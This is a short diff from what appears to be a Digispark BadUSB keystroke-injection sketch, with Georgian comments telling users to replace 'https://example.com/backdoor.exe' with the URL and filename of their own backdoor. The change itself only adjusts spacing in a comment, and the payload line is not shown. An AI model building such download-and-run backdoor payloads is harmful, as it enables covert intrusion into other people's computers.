@@ -16,4 +16,4 @@ void loop() {
   DigiKeyboard.delay(5000);
 }
 // [Line 11]  - https://example.com/backdoor.exe -ს მაგივრად ჩაწერეთ თქვენი ბექდორის მისამართი,
-// [Line 11]  - backdoor.exe-ს მაგივრად გაწერეთ თქვენი ბექდორის filename
+// [Line 11]  - backdoor.exe -ს მაგივრად გაწერეთ თქვენი ბექდორის filename
